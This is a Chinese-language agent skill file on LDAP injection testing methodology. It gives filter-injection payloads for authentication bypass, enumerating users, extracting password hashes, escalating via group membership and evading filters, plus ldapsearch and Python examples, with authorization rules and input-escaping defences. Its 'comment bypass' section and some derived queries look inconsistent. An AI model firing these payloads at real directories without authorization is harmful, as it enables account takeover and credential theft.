---
name: ldap-injection-testing
description: LDAP注入漏洞测试的专业技能和方法论
version: 1.0.0
---

# LDAP注入漏洞测试

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

LDAP注入是一种类似于SQL注入的漏洞，利用LDAP查询语句的构造缺陷，可能导致信息泄露、权限绕过等。本技能提供LDAP注入的检测、利用和防护方法。

## 漏洞原理

应用程序将用户输入直接拼接到LDAP查询语句中，未进行充分验证和过滤，导致攻击者可以修改查询逻辑。

**危险代码示例：**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP基础

### 查询语法

**基础查询：**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### 特殊字符

**需要转义的字符：**
- `(` `)` - 括号
- `*` - 通配符
- `\` - 转义符
- `/` - 路径分隔符
- `NUL` - 空字符

## 测试方法

### 1. 识别LDAP输入点

**常见功能：**
- 用户登录
- 用户搜索
- 目录浏览
- 权限验证

### 2. 基础检测

**测试特殊字符：**
```
*)(&
*)(|
*))(
*))%00
```

**测试逻辑操作符：**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. 认证绕过

**基础绕过：**
```
用户名: *)(&
密码: *
查询: (&(cn=*)(&)(userPassword=*))
```

**更精确的绕过：**
```
用户名: admin)(&(cn=admin
密码: *))
查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. 信息泄露

**枚举用户：**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**获取属性：**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## 利用技术

### 认证绕过

**方法1：逻辑绕过**
```
输入: *)(&
查询: (&(cn=*)(&)(userPassword=*))
结果: 匹配所有用户
```

**方法2：注释绕过**
```
输入: admin)(&(cn=admin
查询: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**方法3：通配符**
```
输入: *)(|(cn=*)(userPassword=*
查询: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### 信息泄露

**枚举所有用户：**
```
搜索: *)(cn=*
结果: 返回所有cn属性
```

**获取密码哈希：**
```
搜索: *)(|(cn=*)(userPassword=*
结果: 返回用户和密码哈希
```

**获取敏感属性：**
```
搜索: *)(|(cn=*)(mail=*)(telephoneNumber=*
结果: 返回多个敏感属性
```

### 权限提升

**修改查询逻辑：**
```
原始: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
注入: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
结果: 可能绕过权限检查
```

## 绕过技术

### 编码绕过

**URL编码：**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode编码：**
```
* → \u002A
( → \u0028
) → \u0029
```

### 注释绕过

**使用注释：**
```
*)(&(cn=*
*)(|(cn=*
```

### 空字符注入

**使用NULL字节：**
```
*))%00
```

## 工具使用

### JXplorer

**图形化LDAP客户端：**
- 连接LDAP服务器
- 浏览目录结构
- 执行查询测试

### ldapsearch

```bash
# 基础查询
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# 测试注入
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. 拦截LDAP查询请求
2. 修改查询参数
3. 观察响应结果

### Python脚本

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# 测试注入
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## 验证和报告

### 验证步骤

1. 确认可以控制LDAP查询
2. 验证认证绕过或信息泄露
3. 评估影响（未授权访问、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和输入参数
- LDAP查询构造方式
- 完整的利用步骤和PoC
- 修复建议（输入验证、参数化查询等）

## 防护措施

### 推荐方案

1. **输入验证**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **参数化查询**
   ```java
   // 使用LDAP API的参数化功能
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // 使用API构建查询
   ```

3. **白名单验证**
   ```java
   // 只允许特定字符
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **最小权限**
   - LDAP连接使用最小权限账户
   - 限制可查询的属性
   - 使用访问控制列表

5. **错误处理**
   - 不返回详细错误信息
   - 统一错误响应
   - 记录错误日志

## 注意事项

- 仅在授权测试环境中进行
- 注意不同LDAP服务器的语法差异
- 测试时避免对目录造成影响
- 了解目标LDAP服务器的配置